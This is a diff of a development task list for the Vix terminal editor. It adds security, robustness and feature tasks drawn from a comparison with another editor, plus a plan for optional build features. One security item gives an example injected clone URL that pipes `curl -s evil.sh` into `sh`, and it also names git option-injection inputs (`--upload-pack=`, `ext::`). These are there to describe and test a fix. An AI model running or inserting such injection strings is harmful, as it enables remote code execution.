@@ -6346,7 +6346,11 @@ as every other task.
   Recorded here, sized honestly as large/architectural, rather than
   guessed at or silently left undiscovered — a real follow-on project,
   not something to start speculatively.
-- [ ] **T565 — Fixed-plural-form translations are grammatically wrong
+  **Partly done (2026-10-19):** text is reordered per UAX #9 (`bidi`
+  setting) and docks plus the editor scroll bar mirror (`mirror_layout`).
+  Still open: mirroring the menu bar and open menus, and right-aligning
+  text inside panels.
+- [x] **T565 — Fixed-plural-form translations are grammatically wrong
   for Arabic, Russian, and Polish across most counted-value strings.**
   `rust-i18n` 4.2.1 (confirmed via its vendored source) has no
   plural-rule support at all — every `%{count}`/`%{n}` key is one fixed
@@ -6440,6 +6444,380 @@ as every other task.
 
 ---
 
+## Run K (comparator scan: ttt, 2026-10-09)
+
+Source: [eugenioenko/ttt](https://github.com/eugenioenko/ttt) v1.5.0 →
+v1.7.1 (2026-09-10 → 2026-10-09, ~150 PRs) plus its open issues. Each
+item below was checked against Vix's actual code first; the ttt PR that
+prompted it is cited so the reasoning can be re-checked. Already covered
+in Vix, so deliberately **not** tasks: inline images (`ratatui_image`),
+explorer git-status colors (`src/ui/explorer.rs`), reveal-active-file
+(`vix-left-dock::reveal`), trim trailing whitespace (`trim-on-save`),
+transparent background, `vix -` stdin (T208), `llms.txt`, LSP URI
+percent-encoding (`vix_lsp::path_to_uri`), and flag-safe `git grep -e`
+(ttt #651's bug class doesn't apply there). Ranked by severity, then
+value/effort.
+
+### Security & hardening
+
+- [x] **T569 — Git → Clone… injects the prompted URL into a shell
+  command unquoted (shell + git-option injection).**
+  `src/app/git.rs:1274` runs `self.run_command(&format!("git clone
+  {url}"))`, and `run_command` hands that to `sh -c` / `cmd /c`. A
+  "clone URL" pasted from a web page or chat, such as
+  `https://example.org/r.git; curl -s evil.sh | sh`, runs the extra
+  command, and `--upload-pack=<cmd>` gets git itself to run one. The jj
+  sibling (`jj_clone`, `:246`) does single-quote the URL, but a leading
+  `-` is still read as an option. Separately, the POSIX single-quoting
+  used here and in `git_grep` (`:1320`) means nothing to `cmd.exe`, so
+  on Windows `&`/`|` in a pattern or URL are still live (T547-era
+  Windows support makes that reachable). ttt's own **Clone Repository**
+  (#682) and its rg-flag fix (#651) are what led here. Fix: reject a URL
+  that starts with `-`, put `--` before it (`git clone -- <url>`; check
+  that `jj git clone` accepts it), and pass `-c protocol.ext.allow=never
+  -c protocol.fd.allow=never`. Best option: stop going through the shell
+  for these. Add a `run_argv_in(dir, &[&str])` sibling of
+  `run_command_in` that streams a `Command` with real argv into the dock
+  the same way, then move clone, grep, and the jj message commands onto
+  it. Tests: crafted `;`, `$(…)`, `` ` ``, `--upload-pack=`, and `ext::`
+  inputs reach git as one argv element or are rejected. **Small effort,
+  high severity.**
+- [x] **T570 — Background remote VCS commands can take over the terminal
+  with an auth prompt.** `git push/pull/fetch` (`git_remote_command`),
+  `jj git push/fetch/clone`, and `git commit` with `commit.gpgsign` all
+  run while Vix holds the terminal in raw mode. `run_command_in` closes
+  stdin (T547), but git, ssh, and `pinentry-curses` open `/dev/tty`
+  directly, so a password, passphrase, or host-key prompt draws over the
+  UI and steals keystrokes, or leaves the command hanging with nothing on
+  screen. ttt hit the same class in #748 (credential prompts during
+  plugin install). Fix: for VCS remote commands, set
+  `GIT_TERMINAL_PROMPT=0`, `GCM_INTERACTIVE=never`, and (only when the
+  user hasn't set their own) `GIT_SSH_COMMAND="ssh -o BatchMode=yes"`.
+  Turn the resulting auth failure into a translated hint ("authentication
+  needed — use ssh-agent or a credential helper"). For commit signing,
+  detect `commit.gpgsign=true` with a curses/tty pinentry and warn before
+  running rather than let it corrupt the screen. `process_group(0)` is
+  safe under `forbid(unsafe_code)` and stops the child grabbing
+  terminal *input* (SIGTTIN), which makes it a useful second layer. Spec
+  the behavior in `spec/` or `crates/vix-git/spec/` first. **Small-medium
+  effort.**
+- [x] **T571 — Opening a FIFO, socket, device, huge file, or non-UTF-8
+  file can freeze Vix, exhaust memory, or fail with a raw error.**
+  `vix_editor::Editor::open` (`crates/vix-editor/src/editor.rs:578`)
+  calls `fs::read_to_string` with no checks. On a FIFO that blocks the
+  UI thread forever, `/dev/zero` grows memory until OOM, a multi-GB log
+  is read whole, and a Latin-1 or binary file fails with "stream did not
+  contain valid UTF-8". ttt fixed the same class in #628
+  (pipes/sockets/devices), and its v1.6 changelog notes binary files
+  stopped loading into a text buffer. Fix: `metadata()` first; refuse
+  anything that isn't a regular file (or symlink to one) with a
+  translated message. Above a size threshold (new
+  `editor_behavior.large_file_mb`, default ~50), ask before opening.
+  Sniff the first 8 KiB for NUL bytes and offer the existing byte editor
+  (`edit_bytes`) instead of a text buffer. For non-UTF-8 text, offer a
+  lossy read-only open rather than an error. Apply the same guard to the
+  other `read_to_string(&path)` sites a user can point at arbitrary
+  paths (`src/app.rs:5544/5910/5935`, `src/app/info_panels.rs:27`,
+  explorer preview) via one shared helper, ideally in `vix-fileops`.
+  Watch for the `vix -` stdin path (T208): it must keep working.
+  **Small-medium effort.**
+- [x] **T572 — Files without write permission are never flagged as
+  read-only.** `Editor::open` hardcodes `read_only: false`
+  (`crates/vix-editor/src/editor.rs:586`). `Tab::read_only` is only set
+  by explicit toggles and synthetic tabs (`src/app.rs:2476`,
+  `src/app/org.rs:1531/1555`), so the user finds out only when the save
+  fails. ttt #698/#701 flag such files, show a lock on the tab, and
+  confirm before a save attempt. Fix: decide in the spec whether
+  "filesystem read-only" is a separate state from the user's View-only
+  toggle (probably yes, so toggling one doesn't clear the other). Set it
+  from `metadata().permissions().readonly()`, which covers Windows'
+  read-only attribute too, plus an `access(W_OK)`-equivalent probe where
+  that falls short (root-owned files under a normal user). Show a lock in
+  the tab, and make save offer "Save As…" rather than fail silently.
+  **Small effort.**
+- [x] **T573 — Prove the test suite makes no network calls, and keep it
+  that way.** ttt v1.7.1 was a fast-follow release because an AUR build
+  ran a test that did a real `git clone`, and git prompted for GitHub
+  credentials inside a packaging sandbox. Vix is packaged too (Homebrew,
+  installers; see T306), and distro builders run `cargo test` offline.
+  Fix: audit tests for `git` remote ops, `ureq`/HTTP-client calls, DNS,
+  and `example.com`-style hosts, and replace any with local fixtures.
+  Set `GIT_TERMINAL_PROMPT=0` in test git helpers. Add one Linux CI job
+  that runs the suite under `unshare -rn` (no network namespace) so a
+  regression fails CI instead of a downstream packager. **Small effort.**
+- [x] **T574 — Budget the per-buffer gutter diff.** `vix_git::diff_marks`
+  (`crates/vix-git/src/lib.rs:151`, called from `src/app/git.rs:377`)
+  runs `similar`'s Myers diff with no deadline against `HEAD`. Myers is
+  linear-space but `O((N+M)·D)` time, so a large, heavily rewritten file
+  can stall a frame. ttt #673 fixed the same thing (quadratic LCS memory,
+  plus cancelling stale gutter diffs). Fix: pass a
+  `TextDiff::configure().deadline(…)` (tens of ms) and skip the gutter
+  diff above a line-count cap. If the diff ever moves to a background
+  thread, drop results for a stale buffer generation. Add a regression
+  bench in `benches/`. **Small effort.**
+
+### Robustness
+
+- [x] **T575 — App-level "chaos monkey" test driver.** `fuzz/` covers
+  parsers, and integration tests cover scripted flows, but nothing feeds
+  long *random* event streams through the real `App`. ttt runs one as a
+  manual and pre-release CI workflow (#511, #521) and recently made it
+  report hung iterations instead of stalling (#719). Fix: a seeded,
+  reproducible generator of key/mouse/resize/paste events, weighted
+  toward menu chords and overlay open/close, driven into `App` on
+  `TestBackend` in a temp workspace with no network (see T573) and no
+  real clipboard (see the known-flaky clipboard test). Run each iteration
+  under a watchdog thread. A panic or timeout prints the seed and the
+  last N events so it replays exactly. Wire it as a
+  `workflow_dispatch`/nightly GitHub job, not the per-push gate. **Medium
+  effort.**
+
+### Features
+
+- [x] **T576 — LSP: Restart Server and Show Server Log.** A stuck
+  language server currently means restarting Vix, and server stderr goes
+  to `Stdio::null()` (`crates/vix-lsp/src/lib.rs:1422`, `:1709`), so
+  there is nothing to look at when one misbehaves. ttt #737/#741 added
+  both. Fix: capture each server's stderr into a bounded ring buffer
+  (e.g. last 2,000 lines) on a reader thread. **LSP → Show Server Log**
+  opens it in a read-only tab. **LSP → Restart Server** does `shutdown`
+  then respawn, then re-sends `didOpen` for every open buffer of that
+  language and clears stale diagnostics. New action ids need menu +
+  palette entries, i18n across all locales, and `vix-lsp`'s spec updated.
+  **Small-medium effort.**
+- [x] **T577 — Opt-in "stage everything and commit?" when nothing is
+  staged.** `require_staged` (`src/app/git.rs:45`) just refuses with
+  `status.git_nothing_staged`. ttt #644 (and VS Code's
+  `git.enableSmartCommit`) stages all changes first. Fix: a
+  `git.smart_commit` setting (`"ask"` default, plus `"always"` and
+  `"never"`). With `"ask"`, nothing staged, and a dirty tree, a confirm
+  prompt runs `git add -A` and continues the commit. Never stage
+  silently by default, because it surprises people who stage on purpose.
+  **Small effort.**
+- [x] **T578 — Scrollbar markers: git changes, diagnostics, search
+  matches.** The scrollbar (`crates/vix-editor/spec/scrollbars/index.md`)
+  shows only the one-cell `●` thumb. ttt #671 (open) asks for git change
+  marks on the scrollbar, the way VS Code's overview ruler shows them.
+  Fix: extend the spec so the vertical track cells can carry colored
+  markers from the same sources the gutter already uses (`gutter_marks`,
+  diagnostics, live search matches), bucketed by proportional row, with
+  the thumb drawn on top. Gate it behind a `show_scrollbar_markers`
+  setting. **Small-medium effort.**
+- [x] **T579 — `theme = "auto"`: follow the terminal's light/dark
+  background.** Users switch terminal appearance with the OS; Vix keeps
+  one fixed theme. ttt #607 asks for the same thing (open). Fix: at
+  startup, query the background with OSC 11 (with a short timeout,
+  falling back to `COLORFGBG`, then dark). Compute its luminance and
+  pick `theme_light` or `theme_dark` (new settings, defaulting to an
+  existing light/dark pair). Don't re-query mid-session in v1. **Small
+  effort**, but it touches startup terminal I/O, so test on the CI
+  terminals and Windows Terminal.
+- [x] **T580 — Verify Move Line Up/Down across collapsed folds.**
+  `vix-editor-core`'s `move_line` (`src/lines.rs`) swaps single lines
+  and never mentions folds. ttt #653 found that moving a line past a
+  collapsed fold split it or moved into its hidden body; the fold should
+  move as a unit. Verify-first: write the failing test, fix only if it
+  fails. **Small effort.**
+- [x] **T581 — Verify autoscroll while drag-selecting past the top or
+  bottom edge.** ttt #699 fixed this in its editor. Vix's left-drag
+  handling (`src/app.rs:7911`/`7942`) may stop extending the selection
+  once the pointer leaves the text area. Terminals only report drag on
+  *motion*, so a held, still pointer outside the view needs a timer-driven
+  scroll tick. Verify-first, as for T580. **Small effort.**
+
+---
+
+## Run L (capability Cargo features, researched 2026-10-09)
+
+Make capabilities such as the **DB** menu + workbench (`sql`) and the
+**Git** menu + integration (`git`) optional at build time. Full rationale,
+the measured per-area payoff, and the design are in `plan.md` §
+"Capability Cargo features". It **reverses T103/T111's "wired in = always
+compiled" call**, deliberately and only for areas with a measured payoff.
+Every capability stays default-on, so released binaries are unchanged.
+Measurements came from `cargo metadata` edge analysis (nothing was built):
+exclusive third-party crates are sql 48, image 81, script 9, terminal 10,
+http/ai 0–2 alone, sql+http+ai 88; git/jj/lsp/dap/org 0. `org` is
+**deliberately not flagged**: no payoff, and the heaviest coupling.
+
+### Prerequisites (worth doing even if no flag ever lands)
+
+- [x] **T582 — Shared plumbing a feature split depends on.**
+  - (a) `menu_index_for_alt` (`src/app.rs:13787`) hard-codes the
+    Alt-mnemonic indices (`'g' => Some(9)`, …). Look each menu up by
+    `MenuDef.name` instead, so removing or adding a top-level menu can't
+    move mnemonics. `tests/integration/menu.rs:366-393` already resolves
+    by name.
+  - (b) Delete the root package's vestigial direct deps: `sqlx`,
+    `tokio`, `futures-util`, `ureq`, and `portable-pty`, which root
+    `src/` never names. Also delete the 15–16 dead `optional = true`
+    `tree-sitter-*` root deps, which create stray implicit features like
+    `--features tree-sitter-rust`.
+  - (c) Bring the stale internal `version = "1.5.0"` path-dep pins
+    (`vix-settings` → vix-db/vix-dap/vix-org-capture, some in vix-db and
+    vix-lsp) up to the workspace version.
+
+  Verify with `cargo tree` that nothing drops by accident. **Small
+  effort.**
+- [x] **T583 — Slim the `image` codecs (no flag needed).** Root
+  `image = "0.25"` uses default features, and `ratatui-image`'s
+  `image-defaults` enables `image/default` again. Together they compile
+  an AV1 *encoder* (rav1e, ravif, av1-grain, av-scenechange), exr, tiff,
+  dds, and rayon for an editor that only *displays* PNG/JPEG/GIF/WebP.
+  Fix: `default-features = false` with only the decoders `is_image_path`
+  accepts, in both places. Check that `is_image_path` and its tests
+  agree, then report the real before/after from CI's `binary-size` job.
+  Likely the single biggest size win available. **Small effort.**
+- [x] **T584 — Decouple `vix-settings` from vix-db, vix-dap, and
+  vix-org-capture.** `vix-settings` depends on them only for the field
+  types `db_connections: Vec<vix_db::connect::Connection>`,
+  `debug_adapters: Vec<vix_dap::DebugAdapter>`, and
+  `org_capture_templates` (`crates/vix-settings/src/lib.rs:142/193/209`).
+  Move those plain serde data types into `vix-settings` (or a tiny
+  data-only crate) and have the behavior crates re-export them, so
+  settings stay fully round-trippable in *every* build.
+  `Settings::save` (confy) writes back only fields it knows, so gating
+  the fields themselves would silently delete a user's DB connections
+  the first time a no-`sql` build saves. Add a test that loads a
+  config with every section and saves it with identical content.
+  **Small-medium effort.**
+- [x] **T585 — Move inline dispatch out of `src/app.rs` into per-area
+  submodules.** Today:
+  - DB (`db_action` and ~500 lines, `src/app.rs:9547-10060`), AI
+    (~10061-10960), HTTP (misfiled in `run_lsp_action`, `:3175`),
+    terminal, and project/tests are inline.
+  - jj (`run_jj_action`) and the DAP `run.*` arms are misfiled inside
+    `run_git_action` (`src/app/git.rs:103-321`).
+  - `src/ui/ai_terminal.rs` mixes AI and terminal drawing.
+
+  Give each area its own `src/app/<area>.rs` / `src/ui/<area>.rs`, the
+  same extraction technique as T141/T142, and update `dispatch_scan`'s
+  `DISPATCHERS` list. This makes each later feature a module-level
+  `#[cfg]`, not hundreds of scattered ones. **Medium effort,
+  mechanical.**
+
+### Framework
+
+- [x] **T586 — Capability framework + spec.** New
+  `spec/cargo-features/index.md`: the capability→crates→action-prefix
+  table, "default-on", "gate at the root, filter at runtime",
+  "settings never lose data", and the T103 reversal with its rationale.
+  Update `crates/vix-script/spec/index.md` § "Packaging: not a Cargo
+  feature" to point there. Code:
+  - A root `Capability` enum with `enabled()` = `cfg!(feature = …)` and
+    an action-id-prefix → capability map.
+  - `build_menus()` and the palette filter out disabled top-level menus
+    and leaves at runtime, so `vix-menu`/`vix-palette` stay `cfg`-free.
+  - A disabled id reached via keymap, script `bind_key`, or typed input
+    gets a translated "*X* is not included in this build" message (all
+    locales).
+  - `vix --version --json` and `vix --doctor` list the compiled-in
+    capabilities, so bug reports say what build the user ran.
+
+  The new feature names start as empty features with no `dep:` yet, so
+  this lands without changing the build. **Medium effort.**
+- [x] **T587 — CI: keep every feature combination compiling.**
+  - Add a Linux job: `cargo build`/`test --no-default-features`, plus
+    `cargo hack check --each-feature --no-dev-deps`. Mirror it to GitLab
+    and Codeberg if their quotas allow (GitLab CI quota has been
+    exhausted since 2026-08-29).
+  - Keep the source-text checks default-feature-only and say so in a
+    comment: `tests/action_catalog.rs` (via `dispatch_scan`), menu-bar
+    insta snapshots, and the `list_commands --write` / `generate_man`
+    diffs.
+  - Gate the existing `#[cfg(feature = "lang-rust")]` test pattern the
+    same way for new feature-dependent tests.
+  - Add `scripts/check` step(s).
+
+  **Small-medium effort.**
+
+### Per-capability features (ranked by measured payoff)
+
+- [x] **T588 — `sql` feature.** `dep:vix-db` and `dep:vix-edit-sql`,
+  48 exclusive crates and bundled SQLite C. Gate:
+  - the App fields `db`/`edit_sql`
+  - the `src/app/db.rs` module from T585
+  - `src/ui/db.rs`
+  - the three DB poll calls and `*_running` checks in `main.rs:216-238`
+  - `AiDest::Db` (`cfg(all(feature = "sql", feature = "ai"))`)
+  - `tests/db_smoke.rs` and `tests/integration/db.rs`
+
+  `TOOLS_INSERT_SQL` (plain text snippets) stays: it needs no DB. Prove
+  it with `cargo tree --no-default-features -e normal | grep -c sqlx` =
+  0. **Medium effort.**
+- [x] **T589 — `image` feature.** Forward it into `vix-editor`
+  (`Tab.image: Option<StatefulProtocol>`,
+  `crates/vix-editor/src/editor.rs:187`). Gate the App `picker` field,
+  the terminal image-support query at `main.rs:167-171`, and
+  `StatefulImage` in `src/ui/editor_region.rs`. With the feature off,
+  image paths open in an "image preview not included in this build"
+  info card, or the byte editor. Measure *after* T583; if the slimmed
+  codec set is small, consider closing this as not worth it. **Medium
+  effort.**
+- [x] **T590 — `script` feature.** `dep:vix-script` (rhai, 9 crates;
+  rhai is one of the largest single crates in the build). Gate:
+  - the five script App fields
+  - `src/app/scripts.rs`
+  - the `script:` dynamic-action prefix guard (`src/app.rs:2617`)
+  - `resolve_key_overrides`' script bindings
+  - `TOOLS_SCRIPTS`, by runtime filtering
+  - `tests/integration/scripting.rs` and `tests/example_scripts.rs`
+
+  **Small-medium effort.**
+- [x] **T591 — `terminal` feature.** `dep:vix-terminal` (portable-pty,
+  vt100, 10 crates); removes interactive PTY shell spawning. Gate the
+  `terminal` field, `poll_terminal`/`terminal_running` (`main.rs:198/230`),
+  `draw_terminal`, and the keymap panel route (`keymap.rs:298`). The
+  vscode and sublime keymaps' terminal binding falls through to the T586
+  message. **Small effort.**
+- [x] **T592 — `http` and `ai` features (plus a `net` umbrella).**
+  - `http`: `dep:vix-http-client`, the `tools.http_send` arm, and
+    `http_rx`.
+  - `ai`: `dep:vix-ai-core`/`-diff`/`-panel`, the AI menu, the four App
+    fields, `poll_ai_replace`, the `ai_*` settings (keep them compiled
+    in, per T584's rule), and the cross-uses: Git's generated commit
+    message and DB assist become `cfg(all(…))`.
+  - `net = ["http", "ai", "sql"]` documents the measured combination:
+    with all three off, 88 crates drop, including rustls, **ring**, and
+    keyring, and the build makes no outbound network connections at all.
+
+  Neither flag saves anything alone, so the value here is surface
+  reduction. **Medium effort.**
+- [x] **T593 — `git` and `jj` features (surface-only).** Gating them
+  removes no third-party crates, only the spawning of `git`/`jj`. `git`
+  touches the most shared UI:
+  - explorer colors (`src/ui/explorer.rs:47`)
+  - the status-bar segment (`src/ui/status_bar.rs:49-92`)
+  - the gutter (`src/ui.rs:173`) and the per-loop
+    `refresh_inline_blame`
+  - `refresh_git()` from six call sites
+  - the dashboard commit count, conflict tool, and diff-view
+
+  Each of these needs a git-off fallback, not just a `cfg`. `jj` is easy
+  after T585 moves it out of `git.rs`: no crate, no state, no UI.
+  Do `jj` first; do `git` only if a locked-down build is actually
+  wanted. **jj small, git medium-hard.**
+- [x] **T594 — Decide distribution, then document.** Decide (needs the
+  maintainer) whether to *ship* a minimal or locked-down variant (e.g.
+  `--no-default-features --features syntax-common`) as an extra
+  cargo-dist artifact, or keep feature selection for source builds
+  only. Every extra variant multiplies installers and SBOMs, and
+  Homebrew, npm, and MSI each assume one binary per target. Either way:
+  - document every feature, what it removes, and its measured size in
+    README (~166-176), `docs/install`, and AGENTS.md
+  - add the per-feature-off release sizes to the `binary-size` CI
+    comment
+
+  **Small effort, decision-gated.**
+
+`lsp`/`dap` features are deliberately *not* tasked. They are
+surface-only (0 crates), the coupling is hard (the completion popup is
+reused by the Org-roam and contacts completers), and `lsp_enabled`
+already gives a runtime off switch. Revisit only if a locked-down build
+is actually requested.
+
+---
+
 ## Ideas backlog (unscoped)
 
 Bigger or more speculative than the tasks above — not yet sized, not yet
@@ -6477,6 +6855,21 @@ scratch each time they come up.
   worth revisiting if that stops being true, or if CodeQL's logic-bug
   queries (not just memory-safety ones) turn out to catch something
   clippy pedantic doesn't.
+- **Rhai: per-script persistent storage and a gutter-click hook** (from
+  ttt #733 `ttt.storage` / #734 `gutter.click`, which together power its
+  Bookmarks plugin). It conflicts with `crates/vix-script/spec/index.md`
+  § "What's deliberately not in v1" (no file access, no shared state), so
+  it needs a capability design first, not just two `register_fn`s.
+- **Runtime-loadable grammars** (ttt #702 loads TextMate grammars from
+  plugins and settings). Vix compiles tree-sitter grammars in. Loading
+  them at runtime would mean tree-sitter's WASM loader or `dlopen`, which
+  `forbid(unsafe_code)` rules out in-tree. Large scope.
+- **Dock the bottom panel to the right edge** (ttt #617). This is a
+  layout-model change across `vix-bottom-dock` and `src/ui.rs`.
+- **Remote-control socket** for terminal-multiplexer integration (ttt's
+  `--listen` and its herdr plugin: open `file:line` in a running editor
+  from another pane). Before scoping, define a trust model for who can
+  connect to the socket.
 
 ---
 
@@ -6541,6 +6934,13 @@ CI-discovered rounds to get genuinely right on Windows).
 
 10. **Run I (promoted from the Ideas backlog):** T553–T557, any order,
     one branch each. Started 2026-09-22.
+11. **Run K (comparator scan: ttt, 2026-10-09):** T569 first (high
+    severity), then T570–T574 (security), T575, then T576–T581 in any
+    order, one branch each.
+12. **Run L (capability Cargo features, 2026-10-09):** T582–T585
+    (prerequisites; T583 and T585 pay off even if no flag ever lands),
+    then T586 + T587 (framework + CI), then T588 → T592 in order, T593
+    only if a locked-down build is wanted, and T594 last.
 
 When a task is finished: check its box here, note the branch/merge commit,
 and record anything learned that changes later tasks.
